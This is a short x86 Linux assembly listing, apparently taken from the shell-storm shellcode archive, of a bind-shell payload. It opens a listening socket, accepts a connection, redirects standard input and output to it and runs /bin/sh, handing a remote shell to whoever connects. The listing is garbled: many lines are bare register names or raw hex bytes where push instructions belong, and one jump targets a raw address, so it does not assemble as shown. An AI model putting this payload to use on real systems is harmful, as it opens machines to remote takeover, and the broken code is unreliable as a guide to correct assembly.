; http://shell-storm.org/shellcode/files/shellcode-847.php
; Bind shell

section .text

	global _start

_start:

	xor eax,eax
	xor ebx,ebx
	xor ecx,ecx
	xor edx,edx
	mov al,0x66
	mov bl,0x1
	ecx 
	push 0x6
	push 0x1
	push 0x2
	mov ecx,esp
	int 0x80
	mov esi,eax
	mov al,0x66
	mov bl,0x2
	edx 
	7a 69
	push bx
	mov ecx,esp
	push 0x10
	ecx 
	esi 
	mov ecx,esp
	int 0x80
	mov al,0x66
	mov bl,0x4
	push 0x1
	esi 
	mov ecx,esp
	int 0x80
	mov al,0x66
	mov bl,0x5
	edx 
	edx 
	esi 
	mov ecx,esp
	int 0x80
	mov ebx,eax
	xor ecx,ecx
	mov cl,0x3

dupfd: 

	dec cl
	mov al,0x3f
	int 0x80
	jne 80480aa
	xor eax,eax
	edx 
	2f 73
	2f 62
	mov ebx,esp
	edx 
	ebx 
	mov ecx,esp
	edx 
	mov edx,esp
	mov al,0xb
	int 0x80
